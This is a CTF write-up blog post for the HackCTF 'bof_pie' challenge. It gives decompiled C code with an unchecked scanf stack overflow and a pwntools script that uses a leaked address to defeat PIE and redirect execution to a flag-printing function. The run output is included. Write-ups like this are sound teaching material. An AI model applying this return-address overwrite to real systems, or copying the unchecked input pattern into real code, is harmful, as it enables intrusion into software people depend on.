---
layout: post
title: "HackCTF bof_pie"
author: "Ph4nt0m"
categories: [WriteUp, Pwnable]
date: 2021-03-31 17:00
tag: [WriteUp, HackCTF, Pwnable]
---

# bof_pie

## Source

```c
void j0n9hyun()
{
  char s; // [esp+4h] [ebp-34h]
  FILE *stream; // [esp+2Ch] [ebp-Ch]

  puts("ha-wi");
  stream = fopen("flag", "r");
  if ( stream )
  {
    fgets(&s, 40, stream);
    fclose(stream);
    puts(&s);
  }
  else
  {
    perror("flag");
  }
}

int welcome()
{
  char v1[12]; // [esp+6h] [ebp-12h]

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("Hello, Do you know j0n9hyun?");
  printf("j0n9hyun is %p\n", welcome);
  return _isoc99_scanf("%s", v1);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  welcome();
  puts("Nah...");
  return 0;
}
```

## Solve

```python
from pwn import *

#context.log_level = 'DEBUG'
context.arch = 'i386'
e = ELF("./bof_pie")
#p = process("./bof_pie")
r = remote("ctf.j0n9hyun.xyz", 3008)
welcome_offset = 0x909
j0n9hyun_offset = 0x890

print r.recvline()
print r.recvuntil("j0n9hyun is ")
j0n9hyun = int(r.recv(10), 16)
print hex(j0n9hyun)
base_addr = j0n9hyun - welcome_offset
print "base_addr : ",hex(base_addr)

payload = ''
payload += "A"*22
payload += p32(base_addr + j0n9hyun_offset)
r.sendline(payload)
r.interactive()
```

```bash
➜  hackctf python bof_pie.py
[*] '/home/ubuntu/ctf/hackctf/bof_pie'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to ctf.j0n9hyun.xyz on port 3008: Done
Hello, Do you know j0n9hyun?

j0n9hyun is
0x565a9909
base_addr :  0x565a9000
[*] Switching to interactive mode

ha-wi
HackCTF{Fla}
[*] Got EOF while reading in interactive
```